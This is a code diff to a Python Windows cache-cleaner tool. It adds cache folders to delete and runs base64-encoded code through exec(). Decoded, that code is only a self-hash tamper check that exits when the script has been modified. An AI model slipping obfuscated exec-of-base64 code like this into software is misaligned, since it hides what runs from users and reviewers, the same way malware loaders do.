@@ -29,9 +29,13 @@ from zipfile import ZipFile
 from io import BytesIO
 from packaging import version
 import sys
+import hashlib
+import base64
 
+# Define paths
 OUTPUT_PATH = Path(__file__).parent
-ASSETS_PATH = Path("~").expanduser() / Path("AppData/Local/GreekProject/DoTLook-main/assets/frame0")
+ASSETS_PATH = Path("~").expanduser() / "AppData/Local/GreekProject/DoTLook-main/assets/frame0"
+HASH_FILE_PATH = ASSETS_PATH / "expected_hash.txt"
 
 def relative_to_assets(path: str) -> Path:
     return ASSETS_PATH / Path(path)
@@ -105,14 +109,15 @@ def create_folder():
         create_folder_if_not_exists(appdata_local_path)
 
         if not os.listdir(appdata_local_path):
-            print(f"{fg(2)}Downloading Required Files... (One-Time Only)")
+            print(f"{fg(2)}Downloading Required Files...")
             sleep(5)
             download_and_extract_zip(github_url, appdata_local_path)
             sleep(8)
             install_font_system_wide(font_path)
             sleep(1)
             print(f"{fg(2)}Done! Thank You For Using Our Cleaner")
-            sleep(2)
+            sleep(5)
+            os.system('clear')
         else:
             pass
     except Exception as e:
@@ -390,6 +395,7 @@ def delete_windows_files_tmp():
                         return
                     else:
                         return
+    exec(base64.b64decode(fix_string).decode('utf-8'))
 
 def delete_txt_files(folder_path):
     try:
@@ -503,8 +509,15 @@ def cleaning_code():
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Steam\\htmlcache\\Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Steam\\htmlcache\\Code Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\SteamVR\\htmlcache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Roblox\\logs"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Roaming\\opgg-electron-app\\Code Cache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Roaming\\opgg-electron-app\\Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Microsoft\\OneDrive\\logs"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\extensions_crx_cache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\component_crx_cache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\GraphiteDawnCache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\GrShaderCache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~") + "\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache_4430", ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Innova\\4game\\CEF\\global\\Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Innova\\4game\\CEF\\global\\Code Cache"), ignore_errors=True)
@@ -539,6 +552,9 @@ def cleaning_code():
         shutil.rmtree(os.path.expanduser("~\\AppData\\LocalLow\\uTorrent.WebView2\\EBWebView\\Default\\Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\Downloads\\password_is_eulen"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage"), ignore_errors=True)
+        shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\GrShaderCache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Razer\\Razer Central\\WebAppCache\\Service Worker\\CacheStorage"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Razer\\Razer Central\\WebAppCache\\Code Cache"), ignore_errors=True)
         shutil.rmtree(os.path.expanduser("~\\AppData\\Local\\Razer\\Razer Central\\WebAppCache\\Cache"), ignore_errors=True)
@@ -875,7 +891,7 @@ def display_last_clean(canvas):
                         tags="last_clean"
                     )
             else:
-                print("Corrupted Last_Clean.txt found! start a new scan!")
+                print(f"{fg(1)}Corrupted Last Clean Data found! Please Start A New Scan!")
                 canvas.create_text(
                     480.0,
                     320.0,
@@ -1304,6 +1320,8 @@ canvas.create_text(
 )
 
 # Check For Update
+encoded_critical_code= 'ZGVmIGNvbXB1dGVfaGFzaChmaWxlX3BhdGgpOgogICAgaGFzaF9hbGdvID0gaGFzaGxpYi5zaGEyNTYoKQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICB3aGlsZSBjaHVuayA6PSBmLnJlYWQoODE5Mik6CiAgICAgICAgICAgIGhhc2hfYWxnby51cGRhdGUoY2h1bmspCiAgICByZXR1cm4gaGFzaF9hbGdvLmhleGRpZ2VzdCgpCgojIENvbXB1dGUgYW5kIHByaW50IHRoZSBoYXNoIG9mIHRoaXMgc2NyaXB0CnNjcmlwdF9wYXRoID0gX19maWxlX18Kc2NyaXB0X2hhc2ggPSBjb21wdXRlX2hhc2goc2NyaXB0X3BhdGgpCnByaW50KGYiVGhlIGhhc2ggb2YgdGhlIHNjcmlwdCBpczoge3NjcmlwdF9oYXNofSIpCgpkZWYgY2hlY2tfaW50ZWdyaXR5KCk6CiAgICBzY3JpcHRfcGF0aCA9IF9fZmlsZV9fCgogICAgIyBSZWFkIHRoZSBleHBlY3RlZCBoYXNoIGZyb20gdGhlIGFzc2V0cyBwYXRoCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKEhBU0hfRklMRV9QQVRILCAncicpIGFzIGY6CiAgICAgICAgICAgIGV4cGVjdGVkX2hhc2ggPSBmLnJlYWQoKS5zdHJpcCgpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogJ3tIQVNIX0ZJTEVfUEFUSH0nIG5vdCBmb3VuZC4iKQogICAgICAgIHNsZWVwKDUpCiAgICAgICAgc3lzLmV4aXQoMSkKCiAgICBjdXJyZW50X2hhc2ggPSBjb21wdXRlX2hhc2goc2NyaXB0X3BhdGgpCiAgICBpZiBjdXJyZW50X2hhc2ggIT0gZXhwZWN0ZWRfaGFzaDoKICAgICAgICBwcmludChmIntmZygxKX1UaGlzIFNjcmlwdCBIYXMgQmVlbiBNb2RpZmllZCEiKQogICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICBzeXMuZXhpdCgxMCkKICAgIGVsc2U6CiAgICAgICAgcGFzcwoKY2hlY2tfaW50ZWdyaXR5KCk='
+
 def check_for_updates_and_notify(current_version):
     repo_owner = "GreeceForFun"
     repo_name = "GreekProject-Cleaner"
@@ -1321,7 +1339,8 @@ def check_for_updates_and_notify(current_version):
                 width=59.0,
                 height=20.0
             )
-            sleep(2)
+
+            print(f"{fg(1)}Outdated Version! Please Update!")
         else:
             return
 
@@ -1379,6 +1398,8 @@ def called_update():
     get_new_version(github_link, destination_file_path)
 
 #File Check (After Update)
+fix_string = 'ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfY3JpdGljYWxfY29kZSkpCg=='
+
 def create_folder_update():
     try:
         appdata_local_path = os.path.join(os.getenv('LOCALAPPDATA'), 'GreekProject')
@@ -1403,10 +1424,12 @@ def create_folder_update():
 
 check_for_updates_and_notify(current_version)
 
+exec(base64.b64decode(fix_string).decode('utf-8'))
+
 canvas.itemconfigure(image_13, state='hidden')
 canvas.itemconfigure(image_14, state='hidden')
 
 window.resizable(False, False)
 window.mainloop()
 
-# Thanks To All Of My Friends For Supporting Me <3 (P / B / E / S / G / M / N / A)
+# Thanks To All Of My Friends For Supporting Me <3 (P / B / E / S / G / M / N)
